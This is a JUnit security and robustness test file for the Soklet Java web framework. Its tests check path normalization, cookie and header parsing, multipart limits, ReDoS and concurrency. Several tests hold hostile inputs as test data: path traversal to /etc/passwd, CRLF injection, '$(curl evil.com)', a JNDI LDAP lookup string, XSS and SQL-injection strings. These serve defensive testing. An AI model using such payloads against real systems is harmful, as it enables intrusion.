/*
 * Copyright 2022-2025 Revetware LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.soklet;

import com.soklet.annotation.GET;
import com.soklet.annotation.POST;
import com.soklet.annotation.PathParameter;
import com.soklet.annotation.RequestBody;
import com.soklet.annotation.ServerSentEventSource;
import com.soklet.converter.ValueConversionException;
import com.soklet.converter.ValueConverterRegistry;
import com.soklet.exception.IllegalRequestBodyException;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.lang.ref.WeakReference;
import java.net.ServerSocket;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * @author <a href="https://www.revetkn.com">Mark Allen</a>
 */
public class AdvancedTests {

	// ==================== Bug 1: SSE Connection Race Conditions ====================

	@Test
	public void testSSERaceConditionOnConcurrentConnectionsAndDisconnections() throws Exception {
		// This test attempts to trigger race conditions in SSE connection management
		// by rapidly connecting and disconnecting multiple clients concurrently

		Server server = Server.withPort(findFreePort()).build();
		ServerSentEventServer sseServer = ServerSentEventServer.withPort(findFreePort())
				.concurrentConnectionLimit(100)
				.heartbeatInterval(Duration.ofMillis(100))
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.serverSentEventServer(sseServer)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(SSETestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			// Simulate multiple concurrent connections
			ExecutorService executor = Executors.newFixedThreadPool(50);
			CountDownLatch startLatch = new CountDownLatch(1);
			AtomicInteger connectionErrors = new AtomicInteger(0);
			AtomicInteger successfulConnections = new AtomicInteger(0);

			List<Future<?>> futures = new ArrayList<>();

			for (int i = 0; i < 100; i++) {
				final int clientId = i;
				futures.add(executor.submit(() -> {
					try {
						startLatch.await();

						// Simulate SSE connection
						Request request = Request.with(HttpMethod.GET, "/events")
								.headers(Map.of("Accept", Set.of("text/event-stream")))
								.build();

						// In a real scenario, this would be an actual HTTP connection
						// Here we're testing the internal handling
						Thread.sleep(ThreadLocalRandom.current().nextInt(10, 100));

						successfulConnections.incrementAndGet();

						// Simulate abrupt disconnection
						if (clientId % 3 == 0) {
							Thread.sleep(ThreadLocalRandom.current().nextInt(10, 50));
							// Force disconnect
						}
					} catch (Exception e) {
						connectionErrors.incrementAndGet();
					}
				}));
			}

			startLatch.countDown(); // Start all threads simultaneously

			// Wait for all operations to complete
			for (Future<?> future : futures) {
				try {
					future.get(10, TimeUnit.SECONDS);
				} catch (TimeoutException e) {
					// Connection hung - this indicates a deadlock or race condition
					Assertions.fail("SSE connection operation timed out - possible deadlock");
				}
			}

			executor.shutdown();

			// Verify no errors occurred
			Assertions.assertEquals(0, connectionErrors.get(), "Connection errors detected");

			// Give time for cleanup
			Thread.sleep(500);

			// Verify all connections were properly cleaned up
			// This would require access to internal state, but in practice
			// we'd check for memory leaks or orphaned connections
		}
	}

	// ==================== Bug 2: Path Traversal Vulnerability ====================

	@Test
	public void testPathTraversalVulnerability() {
		// Test various path traversal attempts
		String[] maliciousUrls = {
				"/api/../../../etc/passwd",
				"/api/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
				"/api/..%2f..%2f..%2fetc%2fpasswd",
				"/api/..;/..;/..;/etc/passwd",
				"/api/..%252f..%252f..%252fetc%252fpasswd", // Double encoding
				"/api/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", // Invalid UTF-8
				"/api/.../.../...//etc/passwd",
				"/api/\\..\\..\\..\\/etc/passwd"
		};

		for (String maliciousUrl : maliciousUrls) {
			String normalized = Utilities.normalizedPathForUrl(maliciousUrl, true);

			// Verify that path traversal attempts are neutralized
			Assertions.assertFalse(
					normalized.contains(".."),
					"Path traversal not prevented for: " + maliciousUrl
			);

			// Verify the path doesn't escape the expected root
			Assertions.assertTrue(
					normalized.startsWith("/api") || normalized.equals("/"),
					"Path escapes root directory: " + normalized
			);
		}
	}

	@Test
	public void testPathNormalizationEdgeCases() {
		// Test edge cases in path normalization
		Map<String, String> testCases = new HashMap<>();
		testCases.put("", "/");
		testCases.put("//multiple///slashes////", "/multiple/slashes");
		testCases.put("/trailing/", "/trailing");
		testCases.put("/%00/null-byte", "/"); // Null byte should be handled
		testCases.put("/\\/backslash", "/\\/backslash");
		testCases.put("/unicode/\u0000/null", "/unicode/"); // Unicode null

		for (Map.Entry<String, String> testCase : testCases.entrySet()) {
			String input = testCase.getKey();
			String expected = testCase.getValue();

			try {
				String result = Utilities.normalizedPathForUrl(input, true);
				// Some edge cases might not match exactly but should be safe
				Assertions.assertNotNull(result, "Normalization returned null for: " + input);
				Assertions.assertTrue(result.startsWith("/"), "Result should start with /");
			} catch (Exception e) {
				Assertions.fail("Exception during normalization of: " + input + " - " + e.getMessage());
			}
		}
	}

	// ==================== Bug 3: Cookie Parsing Edge Cases ====================

	@Test
	public void testCookieParsingWithEscapedQuotes() {
		// Test cookie parsing with complex escaped sequences
		String[] cookieHeaders = {
				"name=\"value with \\\"escaped quotes\\\"\"",
				"name=\"value with \\\\backslash\\\\\"",
				"name=\"value with \\;semicolon\\;\"",
				"malformed=\"unclosed quote",
				"name=\"value with \nnewline\"",
				"name=value; name2=\"quoted;with;semicolons\"",
				"name=\"\"; empty=\"\"",
				"unicode=\"\u0000\u0001\u0002\"",
				"name=\"value with \\x00 null byte\""
		};

		try {
			Map<String, Set<String>> cookies = Utilities.extractHeadersFromRawHeaderLines(Arrays.asList(cookieHeaders));

			// Verify parsing doesn't crash
			Assertions.assertNotNull(cookies, "Cookie parsing returned null");

			// For quoted values, verify quotes are properly handled
			for (Map.Entry<String, Set<String>> entry : cookies.entrySet()) {
				String name = entry.getKey();
				Set<String> values = entry.getValue();

				for (String value : values) {
					// Value should not contain unescaped quotes
					if (value.startsWith("\"") && value.endsWith("\"")) {
						Assertions.fail("Cookie value still has surrounding quotes: " + value);
					}
				}
			}

		} catch (Exception e) {
			// Some malformed cookies should be handled gracefully
			System.out.println("Cookie parsing exception (may be expected): " + e.getMessage());
		}
	}

	@Test
	public void testCookieInjectionAttack() {
		// Test for cookie injection vulnerabilities
		String[] injectionAttempts = {
				"sessionid=abc123; admin=true",
				"sessionid=abc123\r\nSet-Cookie: admin=true",
				"sessionid=abc123%0D%0ASet-Cookie:%20admin=true",
				"sessionid=abc123; $Domain=.evil.com",
				"sessionid=abc123; Path=/; Domain=.evil.com; admin=true"
		};

		Map<String, Set<String>> cookies = Utilities.extractHeadersFromRawHeaderLines(Arrays.asList(injectionAttempts));

		// Verify no extra cookies were injected
		Assertions.assertTrue(
				cookies.size() <= 2, // Should only have expected cookies
				"Cookie injection may have succeeded with: " + injectionAttempts
		);

		// Verify no admin cookie was injected
		Assertions.assertFalse(
				cookies.containsKey("admin"),
				"Admin cookie was injected"
		);
	}

	// ==================== Bug 4: Multipart Boundary Validation ====================

	@Test
	public void testMultipartBoundaryValidation() {
		// Test various malicious boundary values
		String[] maliciousBoundaries = {
				"", // Empty boundary
				" ", // Whitespace only
				"a".repeat(1000), // Very long boundary
				"boundary\r\nContent-Type: text/html", // Header injection
				"boundary\u0000", // Null byte
				"--", // Just dashes
				"boundary; filename=\"/etc/passwd\"", // Path injection attempt
				"$(curl evil.com)", // Command injection attempt
				"../../etc/passwd", // Path traversal in boundary
				"boundary\nSet-Cookie: admin=true" // Cookie injection via boundary
		};

		for (String boundary : maliciousBoundaries) {
			try {
				// Create a multipart request with malicious boundary
				String contentType = "multipart/form-data; boundary=" + boundary;
				String body = "--" + boundary + "\r\n" +
						"Content-Disposition: form-data; name=\"field\"\r\n\r\n" +
						"value\r\n" +
						"--" + boundary + "--";

				Request request = Request.with(HttpMethod.POST, "/upload")
						.headers(Map.of("Content-Type", Set.of(contentType)))
						.body(body.getBytes(StandardCharsets.UTF_8))
						.build();

				// Attempt to parse - should handle gracefully
				MultipartParser parser = DefaultMultipartParser.defaultInstance();

				try {
					Map<String, Set<MultipartField>> fields = parser.extractMultipartFields(request);

					// If parsing succeeds, verify the boundary was sanitized
					Assertions.assertTrue(
							fields.isEmpty() || boundary.length() < 100,
							"Malicious boundary should have been rejected or sanitized: " + boundary
					);
				} catch (IllegalRequestBodyException e) {
					// Expected for malicious boundaries
				}
			} catch (Exception e) {
				// Should handle errors gracefully
			}
		}
	}

	@Test
	public void testMultipartDoSAttack() {
		// Test DoS via multipart parsing

		// Create a malicious multipart with many small parts
		StringBuilder body = new StringBuilder();
		String boundary = "boundary123";

		// Create 10,000 small parts - potential DoS
		for (int i = 0; i < 10000; i++) {
			body.append("--").append(boundary).append("\r\n");
			body.append("Content-Disposition: form-data; name=\"field").append(i).append("\"\r\n\r\n");
			body.append("x\r\n");
		}
		body.append("--").append(boundary).append("--");

		Request request = Request.with(HttpMethod.POST, "/upload")
				.headers(Map.of("Content-Type", Set.of("multipart/form-data; boundary=" + boundary)))
				.body(body.toString().getBytes(StandardCharsets.UTF_8))
				.build();

		MultipartParser parser = DefaultMultipartParser.defaultInstance();

		long startTime = System.currentTimeMillis();
		try {
			Map<String, Set<MultipartField>> fields = parser.extractMultipartFields(request);
			long endTime = System.currentTimeMillis();

			// Parsing should complete in reasonable time
			Assertions.assertTrue(
					(endTime - startTime) < 5000, // Should complete within 5 seconds
					"Multipart parsing took too long - possible DoS vulnerability"
			);

			// There should be limits on number of fields
			Assertions.assertTrue(
					fields.size() < 1000,
					"Too many multipart fields accepted - possible memory DoS"
			);

		} catch (Exception e) {
			// Expected - should reject excessive parts
		}
	}

	// ==================== Bug 5: Request Size Limit Bypass ====================

	@Test
	public void testRequestSizeLimitBypass() throws IOException {
		// Test that size limits are enforced before parsing
		int maxSize = 1024; // 1KB limit
		byte[] oversizedBody = new byte[maxSize * 2]; // 2KB body
		Arrays.fill(oversizedBody, (byte) 'A');

		SokletConfig config = SokletConfig.withServer(
				Server.withPort(findFreePort())
						.maximumRequestSizeInBytes(maxSize)
						.build()
		).build();

		// Test various content types that trigger different parsers
		Map<String, String> contentTypes = new HashMap<>();
		contentTypes.put("application/json", new String(oversizedBody));
		contentTypes.put("application/x-www-form-urlencoded", "param=" + new String(oversizedBody));
		contentTypes.put("multipart/form-data; boundary=test",
				"--test\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\n" +
						new String(oversizedBody) + "\r\n--test--");

		for (Map.Entry<String, String> entry : contentTypes.entrySet()) {
			String contentType = entry.getKey();
			String body = entry.getValue();

			Request request = Request.with(HttpMethod.POST, "/upload")
					.headers(Map.of("Content-Type", Set.of(contentType)))
					.body(body.getBytes(StandardCharsets.UTF_8))
					.build();

			// The request should be flagged as too large
			Assertions.assertTrue(
					request.isContentTooLarge(),
					"Request not flagged as too large for content-type: " + contentType
			);

			// Parsers should check the flag before processing
			if (contentType.startsWith("multipart/")) {
				try {
					MultipartParser parser = DefaultMultipartParser.defaultInstance();
					Map<String, Set<MultipartField>> fields = parser.extractMultipartFields(request);

					// Should not reach here - parsing should be rejected
					Assertions.fail("Multipart parser processed oversized request");
				} catch (Exception e) {
					// Expected - oversized request should be rejected
				}
			}
		}
	}

	// ==================== Additional Security Tests ====================

	@Test
	public void testHeaderInjectionVulnerability() {
		// Test for HTTP header injection vulnerabilities
		String[] injectionAttempts = {
				"value\r\nX-Injected: true",
				"value\nX-Injected: true",
				"value%0D%0AX-Injected:%20true",
				"value\rX-Injected: true",
				"value%0AX-Injected:%20true"
		};

		for (String injection : injectionAttempts) {
			Response response = Response.withStatusCode(200)
					.headers(Map.of("X-Custom", Set.of(injection)))
					.build();

			Map<String, Set<String>> headers = response.getHeaders();

			// Verify no header injection occurred
			Assertions.assertFalse(
					headers.containsKey("X-Injected"),
					"Header injection vulnerability detected"
			);

			// Verify the original header is sanitized
			Set<String> customHeaders = headers.get("X-Custom");
			if (customHeaders != null) {
				for (String value : customHeaders) {
					Assertions.assertFalse(
							value.contains("\r") || value.contains("\n"),
							"Header value contains CR/LF"
					);
				}
			}
		}
	}

	@Test
	public void testResourceExhaustionViaRegex() {
		// Test for ReDoS (Regular Expression Denial of Service) vulnerabilities
		// Create strings that could cause catastrophic backtracking
		String[] reDoSPatterns = {
				"a".repeat(100) + "X", // For patterns like (a+)+
				"a".repeat(50) + "b".repeat(50), // For alternation patterns
				"x".repeat(1000), // Very long strings
				("a" + "b".repeat(10)).repeat(10) // Nested repetitions
		};

		for (String pattern : reDoSPatterns) {
			long startTime = System.nanoTime();

			// Test various regex-based operations in Soklet
			try {
				// Path normalization
				Utilities.normalizedPathForUrl("/" + pattern, true);

				// Cookie parsing
				Utilities.extractHeadersFromRawHeaderLines(List.of("name=" + pattern));

				// Content-type parsing
				Utilities.extractContentTypeFromHeaderValue("text/plain; charset=" + pattern);

			} catch (Exception e) {
				// Exceptions are OK, we're checking for hangs
			}

			long endTime = System.nanoTime();
			long durationMs = (endTime - startTime) / 1_000_000;

			Assertions.assertTrue(
					durationMs < 1000, // Should complete within 1 second
					"Potential ReDoS vulnerability - operation took " + durationMs + "ms"
			);
		}
	}

	// ==================== Concurrency and Thread Safety Tests ====================

	@Test
	public void testConcurrentRequestProcessing() throws Exception {
		// Test thread safety of request processing under high concurrency
		Server server = Server.withPort(findFreePort())
				.requestHandlerExecutorServiceSupplier(() ->
						Utilities.createVirtualThreadsNewThreadPerTaskExecutor("test-thread", (Thread thread, Throwable throwable) -> {
							throwable.printStackTrace();
						}))
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(ConcurrentTestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			int numThreads = 100;
			int requestsPerThread = 100;
			ExecutorService executor = Executors.newFixedThreadPool(numThreads);
			CountDownLatch startLatch = new CountDownLatch(1);
			CountDownLatch doneLatch = new CountDownLatch(numThreads);
			AtomicInteger successCount = new AtomicInteger(0);
			AtomicInteger errorCount = new AtomicInteger(0);
			Set<String> uniqueResponses = Collections.newSetFromMap(new ConcurrentHashMap<>());

			for (int i = 0; i < numThreads; i++) {
				final int threadId = i;
				executor.submit(() -> {
					try {
						startLatch.await();

						for (int j = 0; j < requestsPerThread; j++) {
							String uniqueId = threadId + "-" + j;
							Request request = Request.with(HttpMethod.POST, "/concurrent")
									.body(uniqueId.getBytes(StandardCharsets.UTF_8))
									.build();

							Soklet.runSimulator(config.copyForSimulator().finish(), simulator -> {
								MarshaledResponse response = simulator.performRequest(request).getMarshaledResponse();
								if (response.getStatusCode() == 200) {
									String responseBody = new String(
											response.getBody().orElse(new byte[0]),
											StandardCharsets.UTF_8
									);

									// Verify response matches request
									if (responseBody.equals("Processed: " + uniqueId)) {
										successCount.incrementAndGet();
										uniqueResponses.add(responseBody);
									} else {
										errorCount.incrementAndGet();
										System.err.println("Mismatch: expected " + uniqueId +
												" but got " + responseBody);
									}
								} else {
									errorCount.incrementAndGet();
								}
							});
						}
					} catch (Exception e) {
						errorCount.incrementAndGet();
						e.printStackTrace();
					} finally {
						doneLatch.countDown();
					}
				});
			}

			startLatch.countDown(); // Start all threads
			boolean completed = doneLatch.await(30, TimeUnit.SECONDS);

			Assertions.assertTrue(completed, "Test didn't complete in time");
			Assertions.assertEquals(0, errorCount.get(), "Errors occurred during concurrent processing");
			Assertions.assertEquals(numThreads * requestsPerThread, successCount.get(), "Not all requests succeeded");
			Assertions.assertEquals(numThreads * requestsPerThread, uniqueResponses.size(), "Duplicate or missing responses detected");

			executor.shutdown();
		}
	}

	@Test
	public void testRequestBuilderThreadSafety() throws Exception {
		// Test that Request.Builder is not thread-safe (as documented)
		// but that built Request objects are immutable and thread-safe

		Request.Builder builder = Request.with(HttpMethod.GET, "/test");
		CountDownLatch latch = new CountDownLatch(1);
		AtomicBoolean builderIsThreadSafe = new AtomicBoolean(true);

		// Try to modify builder from multiple threads (should cause issues)
		int numThreads = 10;
		ExecutorService executor = Executors.newFixedThreadPool(numThreads);

		for (int i = 0; i < numThreads; i++) {
			final int threadId = i;
			executor.submit(() -> {
				try {
					latch.await();
					// Concurrent modifications to builder
					builder.headers(Map.of("Thread-" + threadId, Set.of("value-" + threadId)));
					builder.queryParameters(Map.of("param" + threadId, Set.of("val" + threadId)));
				} catch (Exception e) {
					// Expected - builder is not thread-safe
					builderIsThreadSafe.set(false);
				}
			});
		}

		latch.countDown();
		executor.shutdown();
		executor.awaitTermination(5, TimeUnit.SECONDS);

		// Now test that built Request is immutable and thread-safe
		Request request = Request.with(HttpMethod.POST, "/immutable")
				.headers(Map.of("X-Test", Set.of("value")))
				.body("test".getBytes())
				.build();

		CountDownLatch readLatch = new CountDownLatch(1);
		ExecutorService readExecutor = Executors.newFixedThreadPool(50);
		AtomicBoolean requestIsThreadSafe = new AtomicBoolean(true);

		for (int i = 0; i < 50; i++) {
			readExecutor.submit(() -> {
				try {
					readLatch.await();
					// Concurrent reads from request
					for (int j = 0; j < 100; j++) {
						request.getHttpMethod();
						request.getUri();
						request.getHeaders();
						request.getBody();
						request.getCookies();
						request.getQueryParameters();
					}
				} catch (Exception e) {
					requestIsThreadSafe.set(false);
				}
			});
		}

		readLatch.countDown();
		readExecutor.shutdown();
		readExecutor.awaitTermination(5, TimeUnit.SECONDS);

		Assertions.assertTrue(requestIsThreadSafe.get(), "Request object is not thread-safe");
	}

	// ==================== Memory Leak Tests ====================

	@Test
	public void testSSEBroadcasterMemoryLeak() throws Exception {
		// Test that SSE broadcasters don't leak memory when connections are closed
		Server server = Server.withPort(findFreePort()).build();
		ServerSentEventServer sseServer = ServerSentEventServer.withPort(findFreePort())
				.broadcasterCacheCapacity(10) // Small cache to test eviction
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.serverSentEventServer(sseServer)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(SSEMemoryTestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			List<WeakReference<Object>> references = new ArrayList<>();

			// Create many SSE connections and close them
			for (int i = 0; i < 100; i++) {
				ResourcePath path = ResourcePath.withPath("/events/" + i);
				Optional<? extends ServerSentEventBroadcaster> broadcaster =
						sseServer.acquireBroadcaster(path);

				if (broadcaster.isPresent()) {
					// Keep weak reference to check for garbage collection
					references.add(new WeakReference<>(broadcaster.get()));

					// Simulate some events
					broadcaster.get().broadcastEvent(
							ServerSentEvent.withData("test" + i).build()
					);
				}
			}

			// Force garbage collection
			System.gc();
			Thread.sleep(100);
			System.gc();

			// Check that old broadcasters can be garbage collected
			int collected = 0;
			for (WeakReference<Object> ref : references) {
				if (ref.get() == null) {
					collected++;
				}
			}

			// At least some broadcasters should have been collected due to cache eviction
			Assertions.assertTrue(
					collected > 0, "Potential memory leak - broadcasters not being garbage collected. " +
							"Collected: " + collected + " out of " + references.size()
			);
		}
	}

	@Test
	public void testLargeRequestBodyMemoryHandling() throws Exception {
		// Test memory handling for large request bodies
		Server server = Server.withPort(findFreePort())
				.maximumRequestSizeInBytes(10 * 1024 * 1024) // 10MB limit
				.build();

		SokletConfig config = SokletConfig.withServer(server)
				.resourceMethodResolver(ResourceMethodResolver.withClasses(Set.of(LargeBodyTestResource.class)))
				.build();

		try (Soklet soklet = Soklet.withConfig(config)) {
			soklet.start();

			// Track memory usage
			Runtime runtime = Runtime.getRuntime();
			long memoryBefore = runtime.totalMemory() - runtime.freeMemory();

			// Send multiple large requests
			for (int i = 0; i < 10; i++) {
				byte[] largeBody = new byte[5 * 1024 * 1024]; // 5MB
				Arrays.fill(largeBody, (byte) ('A' + i));

				Request request = Request.with(HttpMethod.POST, "/large")
						.body(largeBody)
						.build();

				Soklet.runSimulator(config.copyForSimulator().finish(), simulator -> {
					MarshaledResponse response = simulator.performRequest(request).getMarshaledResponse();
					Assertions.assertEquals(200, response.getStatusCode().intValue());
				});
			}

			// Force GC and check memory
			System.gc();
			Thread.sleep(100);
			System.gc();

			long memoryAfter = runtime.totalMemory() - runtime.freeMemory();
			long memoryIncrease = memoryAfter - memoryBefore;

			// Memory increase should be reasonable (not holding onto all bodies)
			Assertions.assertTrue(
					memoryIncrease < 50 * 1024 * 1024, // Less than 50MB increase
					"Excessive memory usage detected. Increase: " +
							(memoryIncrease / 1024 / 1024) + "MB"
			);
		}
	}

	// ==================== Value Converter Edge Cases ====================

	@Test
	public void testCustomValueConverterEdgeCases() {
		ValueConverterRegistry registry = ValueConverterRegistry.withDefaults();

		// Test null handling
		try {
			Optional<Object> result = registry.get(String.class, String.class).get().convert(null);
			Assertions.assertFalse(result.isPresent(), "Null should not convert");
		} catch (Exception e) {
			// Some converters might throw on null
		}

		// Test empty string conversions
		testConversion(registry, "", Integer.class, false);
		testConversion(registry, "", Boolean.class, false);
		testConversion(registry, "", LocalDate.class, false);
		testConversion(registry, " ", Integer.class, false); // Whitespace

		// Test boundary values
		testConversion(registry, String.valueOf(Integer.MAX_VALUE), Integer.class, true);
		testConversion(registry, String.valueOf(Integer.MIN_VALUE), Integer.class, true);
		testConversion(registry, String.valueOf(Long.MAX_VALUE), Integer.class, false); // Overflow

		// Test special float/double values
		testConversion(registry, "NaN", Double.class, true);
		testConversion(registry, "Infinity", Double.class, true);
		testConversion(registry, "-Infinity", Double.class, true);

		// Test malformed inputs
		testConversion(registry, "12.34.56", Double.class, false);
		testConversion(registry, "true false", Boolean.class, false);
		testConversion(registry, "2024-13-45", LocalDate.class, false); // Invalid date
	}

	private void testConversion(ValueConverterRegistry registry, String input,
															Class<?> targetType, boolean shouldSucceed) {
		try {
			Optional<Object> result = registry.get(String.class, targetType).get().convert(input);
			if (shouldSucceed) {
				Assertions.assertTrue(result.isPresent(), "Conversion should succeed for: " + input);
			} else {
				Assertions.assertFalse(result.isPresent(), "Conversion should fail for: " + input);
			}
		} catch (ValueConversionException e) {
			if (shouldSucceed) {
				Assertions.fail("Unexpected conversion exception for: " + input);
			}
		}
	}

	// ==================== Resource Path Matching Edge Cases ====================

	@Test
	public void testResourcePathMatchingEdgeCases() {
		// Test various edge cases in path pattern matching
		Map<String, String> pathPatterns = new HashMap<>();
		pathPatterns.put("/users/{id}", "/users/123");
		pathPatterns.put("/users/{id}/posts/{postId}", "/users/123/posts/456");
		pathPatterns.put("/files/{path:.*}", "/files/docs/report.pdf"); // Wildcard
		pathPatterns.put("/api/v{version}/users", "/api/v2/users");
		pathPatterns.put("/{lang}/docs/{page}", "/en/docs/index");

		for (Map.Entry<String, String> entry : pathPatterns.entrySet()) {
			String pattern = entry.getKey();
			String testPath = entry.getValue();

			ResourcePathDeclaration declaration = ResourcePathDeclaration.withPath(pattern);
			boolean matched = declaration.matches(ResourcePath.withPath(testPath));

			Assertions.assertTrue(matched, "Failed to match pattern: " + pattern +
					" with path: " + testPath);
		}

		// Test non-matching cases
		Map<String, String> nonMatchingPaths = new HashMap<>();
		nonMatchingPaths.put("/users/{id}", "/users/");
		nonMatchingPaths.put("/users/{id}", "/users/123/extra");
		nonMatchingPaths.put("/api/v{version}/users", "/api/users");

		for (Map.Entry<String, String> entry : nonMatchingPaths.entrySet()) {
			String pattern = entry.getKey();
			String testPath = entry.getValue();

			ResourcePathDeclaration declaration = ResourcePathDeclaration.withPath(pattern);
			boolean matched = declaration.matches(ResourcePath.withPath(testPath));

			Assertions.assertFalse(matched, "Should not match pattern: " + pattern +
					" with path: " + testPath);
		}
	}

	@Test
	public void testPathParameterInjection() {
		// Test that path parameters can't be used for injection attacks
		ResourcePathDeclaration declaration = ResourcePathDeclaration.withPath("/api/{param}");

		String[] injectionAttempts = {
				"../../../etc/passwd",
				"<script>alert('xss')</script>",
				"'; DROP TABLE users; --",
				"${jndi:ldap://evil.com/a}",
				"{{7*7}}",  // Template injection
				"%00",      // Null byte
				"a".repeat(10000) // Very long parameter
		};

		for (String injection : injectionAttempts) {
			String testPath = "/api/" + URLEncoder.encode(injection, StandardCharsets.UTF_8);
			ResourcePath resourcePath = ResourcePath.withPath(testPath);

			// TODO: finish up
//
//			String extractedParam = resourcePath.getPathParameters().get("param");
//
//			// Parameter should be properly decoded/sanitized
//			Assertions.assertNotNull(extractedParam, "Parameter extraction failed");
//
//			// Verify no directory traversal
//			Assertions.assertFalse(extractedParam.contains(".."), "Path traversal in parameter");
		}
	}

	// ==================== Performance and DoS Tests ====================

	@Test
	public void testComputationalComplexityAttacks() {
		// Test for algorithmic complexity attacks

		// Test 1: Many headers with same name
		Map<String, Set<String>> headers = new LinkedHashMap<>();
		Set<String> values = new HashSet<>();
		for (int i = 0; i < 10000; i++) {
			values.add("value" + i);
		}
		headers.put("X-Many", values);

		long start = System.currentTimeMillis();
		Request request = Request.with(HttpMethod.GET, "/test")
				.headers(headers)
				.build();
		long duration = System.currentTimeMillis() - start;

		Assertions.assertTrue(duration < 1000, "Header processing too slow: " + duration + "ms");

		// Test 2: Many query parameters
		Map<String, Set<String>> queryParams = new LinkedHashMap<>();
		for (int i = 0; i < 1000; i++) {
			queryParams.put("param" + i, Set.of("value" + i));
		}

		start = System.currentTimeMillis();
		request = Request.with(HttpMethod.GET, "/test")
				.queryParameters(queryParams)
				.build();
		duration = System.currentTimeMillis() - start;

		Assertions.assertTrue(duration < 1000,
				"Query parameter processing too slow: " + duration + "ms");
	}

	// ==================== Helper Classes ====================

	public static class ConcurrentTestResource {
		@POST("/concurrent")
		public String handleConcurrent(@RequestBody String data) {
			// Simulate some processing
			try {
				Thread.sleep(ThreadLocalRandom.current().nextInt(1, 10));
			} catch (InterruptedException e) {
				Thread.currentThread().interrupt();
			}
			return "Processed: " + data;
		}
	}

	public static class SSEMemoryTestResource {
		@ServerSentEventSource("/events/{id}")
		public HandshakeResult handleSSE(@PathParameter String id) {
			return HandshakeResult.accept();
		}
	}

	public static class LargeBodyTestResource {
		@POST("/large")
		public Response handleLarge(@RequestBody byte[] body) {
			// Process but don't keep reference to body
			int checksum = Arrays.hashCode(body);
			return Response.withStatusCode(200)
					.body("Processed " + body.length + " bytes, checksum: " + checksum)
					.build();
		}
	}

	public static class TestResource {
		@GET("/test")
		public String test() {
			return "OK";
		}
	}

	public static class SSETestResource {
		@ServerSentEventSource("/events")
		public HandshakeResult handleSSE(Request request) {
			return HandshakeResult.accept();
		}
	}

	private static int findFreePort() throws IOException {
		try (ServerSocket ss = new ServerSocket(0)) {
			ss.setReuseAddress(true);
			return ss.getLocalPort();
		}
	}
}
